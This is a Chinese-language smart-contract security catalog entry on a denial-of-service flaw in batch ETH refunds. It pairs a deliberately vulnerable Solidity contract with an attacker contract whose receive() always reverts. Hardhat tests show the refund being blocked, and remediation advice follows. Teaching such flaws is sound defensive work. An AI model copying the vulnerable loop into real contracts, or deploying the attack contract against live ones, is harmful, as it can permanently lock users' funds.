# 拒绝服务攻击

**漏洞名称：** 拒绝服务攻击 (DDos Attack)

**风险等级：** 致命

**漏洞描述：** 

拒绝服务攻击主要指的是在一笔交易中向多个地址指转移以太币或者其它代币。当其中一个地址转移失败时，整个交易会被重置，从而导致所有转移全部失败，最严重的后果会导致合约中的资产无法转移，永远死锁在合约中。

拒绝服务攻击还有其它场景，例如在盲拍时退币失败从而让别人无法参与竞拍等，详情见 Solidity官方文档:https://docs.soliditylang.org/en/v0.8.7/solidity-by-example.html#blind-auction



**示例代码语言：** Solidity

**漏洞示例代码：**

```solidity
// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.4;

contract DDosDemo {
    mapping(address => uint) public user_amounts;
    mapping(address => bool) public user_is_deposited;
    address[] public all_users;
    bool public isEnd = false;

    function deposit() external payable {
        require(msg.value >0, "zero value");
        user_amounts[msg.sender] += msg.value;
        if(!user_is_deposited[msg.sender]) {
            user_is_deposited[msg.sender] = true;
            all_users.push(msg.sender);
        }
    }

    function payBack() external {
        // first check  state
        require(!isEnd," is end");
        // second change state
        isEnd = true;
        for(uint i=0;i<all_users.length;i++) {
            address payable user = payable(all_users[i]);
            uint value = user_amounts[user];
            user_amounts[user] = 0;
            // third transfer eth
            user.transfer(value);
        }
    }
}

contract DDosAttack {
    function deposit(address target) external payable {
        require(msg.value >0, "zero value");
        DDosDemo(target).deposit{value:msg.value}();
    }

    receive() external payable {
        revert("Good Bye");
    }
}
```







**示例代码简介：**

在上面的代码中，攻击者先调用`DDosAttack`合约的`deposit`函数进行质押操作，然后主合约调用`payBack`函数时，会向攻击合约发送ETH，并回调攻击合约的`receive`函数。在该函数中，直接进行了重置操作从而使得整个交易失败。



**单元测试代码：**

```javascript
const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("ReplayDemo Test", function () {
    let instance;
    let attack;
    let owner,user1,user2,users;

    beforeEach( async function() {
        let DDosDemo = await ethers.getContractFactory("DDosDemo");
        instance = await DDosDemo.deploy();
        
        let DDosAttack = await ethers.getContractFactory("DDosAttack");
        attack = await DDosAttack.deploy();
         
        [owner,user1,user2,...users] = await ethers.getSigners();
    });
    
    describe('ReplayDemo attack test', () => { 
        const value = ethers.utils.parseEther("1.0");

        it("PayBack should be successful while normal deposit", async () => {
            // check init balance
            expect(await ethers.provider.getBalance(instance.address)).to.be.equal(0);
            //deposit
            await instance.deposit({value});
            await instance.connect(user1).deposit({value});
            // check balance
            expect(await ethers.provider.getBalance(instance.address)).to.be.equal(value.mul(2));
            // payback
            await instance.payBack();
            // check balance again
            expect(await ethers.provider.getBalance(instance.address)).to.be.equal(0);
        });

        it("PayBack should be faild while be attacked", async () => {
            // check init balance
            expect(await ethers.provider.getBalance(instance.address)).to.be.equal(0);
            //deposit
            await instance.deposit({value});
            await attack.connect(user1).deposit(instance.address,{value});
            // check balance
            expect(await ethers.provider.getBalance(instance.address)).to.be.equal(value.mul(2));
            // payback
            await expect(instance.payBack()).to.be.revertedWith("Good Bye");
            // check balance again
            expect(await ethers.provider.getBalance(instance.address)).to.be.equal(value.mul(2));
        });
    });
});
```



**相关建议：**

1. 遵循Solidity实践建议 ，使用提币模式而不是一次性批量发送ETH或者其它代币。

2. 如果需要批量发送ETH或者其它代币，最好使用一个地址数组作为输入参数，这样即可以跳过中间出错的地址，又可以防止数组过大从而gas消耗超限。

3. 批量发送ETH或者代币时可以使用call调用来发送，并忽略返回值。注意此时需要防重入。

4. 咨询专业的安全审计公司进行合约代码审计。

   